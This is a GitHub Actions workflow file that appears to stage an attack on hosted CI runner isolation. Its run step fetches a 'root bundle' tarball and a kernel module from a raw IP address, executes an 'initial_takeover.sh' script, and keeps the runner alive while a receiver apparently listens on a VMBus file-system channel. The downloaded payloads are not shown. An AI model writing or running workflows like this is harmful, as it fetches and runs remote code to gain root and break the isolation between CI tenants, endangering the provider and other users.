name: Owned VMBFS isolation receiver

on:
  workflow_dispatch:
    inputs:
      slot:
        description: Receiver slot label
        required: true
        default: "1"

permissions:
  contents: read

jobs:
  receive:
    runs-on: ubuntu-slim
    timeout-minutes: 20
    steps:
      - uses: actions/checkout@08eba0b27e820071cde6df949e0beb9ba4906955 # v4.3.0

      - name: Hold a status-checked VMBFS channel in owned B
        env:
          MATRIX_SLOT: ${{ inputs.slot }}
        run: |
          curl -fsS http://16.146.243.72:8450/gha3900000-root-bundle.tgz -o /tmp/root.tgz
          tar -xzf /tmp/root.tgz -C /tmp
          cp root_vmbfs_receiver.sh /tmp/root_auto.sh
          cp vmbfs_receiver.py /tmp/
          curl -fsS http://16.146.243.72:8450/hvraw_vmbfs_observer.ko \
            -o /tmp/hvraw_vmbfs_observer.ko
          echo '9bd02b2fe22c5151ce9ee73102dd95b74292184b136546c4a41c1c3701203e9e  /tmp/hvraw_vmbfs_observer.ko' | sha256sum -c -
          printf '%s\n' "$GITHUB_RUN_ID" >/tmp/vmbfs-b-run
          printf '%s\n' "$MATRIX_SLOT" >/tmp/vmbfs-b-slot
          chmod +x /tmp/root_auto.sh /tmp/vmbfs_receiver.py
          HVS_INLINE=1 bash /tmp/initial_takeover.sh | tee root-setup.log
          sleep 840

      - uses: actions/upload-artifact@bbbca2ddaa5d8feaa63e36b76fdaad77386f024f # v7.0.0
        if: always()
        with:
          name: vmbfs-receiver-${{ github.run_id }}-${{ inputs.slot }}
          path: root-setup.log
